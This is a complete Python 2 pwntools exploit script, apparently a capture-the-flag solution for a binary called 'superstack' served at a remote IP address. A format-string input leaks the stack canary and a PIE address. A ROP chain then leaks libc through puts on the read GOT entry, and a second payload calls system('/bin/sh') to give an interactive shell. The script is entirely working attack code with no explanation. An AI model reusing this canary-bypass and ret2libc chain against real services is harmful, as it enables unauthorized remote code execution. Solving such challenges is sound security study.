#! python2
import sys

from pwn import *

context.log_level = 'debug'
# ELF("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF("./superstack")
libc = ELF("libc-2.23.so")

sh = remote('121.43.169.147', 8735)

sh.recvuntil("name: ")
sh.sendline("%17$lx %18$lx")
sh.sendafter("girlfirend's name: ", "233")

sh.recv(1)
canary = int(sh.recvuntil("00").ljust(8, "0"), 16)
print "canary=>" + hex(canary)
leak_addr = int(sh.recvuntil("\n").strip("\n"), 16)
print hex(leak_addr)
main_off = leak_addr - 0xb50
print "pie =>" + hex(main_off)
pading = "yes\n\x00\x00"
p_rdi_ret = 0x0000000000000bb3 + main_off
p_rsi_r15_ret = 0x0000000000000bb1 + main_off

payload = pading + "a"*(0x20-len(pading)-8) + p64(canary) + \
    "b"*8 + p64(p_rdi_ret) + p64(elf.got['read']+main_off)
payload += p64(elf.plt['puts'] + main_off) + \
    p64(elf.sym['Certify_sincerity']+main_off)

sh.recvuntil("\x00")
sh.sendline(payload)
sh.recvuntil("hundred!\x0a")
libc_read = u64(sh.recv(6).ljust(8, "\x00"))
libc_base = libc_read-libc.symbols['read']
system = libc_base+libc.symbols['system']
binsh = libc_base + libc.search("/bin/sh").next()

payload = pading + "a"*(0x20-len(pading)-8) + p64(canary) + "b" * \
    8 + p64(p_rdi_ret) + p64(binsh) + p64(system) + p64(1)
sh.sendline(payload)
# gdb.attach(sh)
sh.interactive()
print(sh.recv())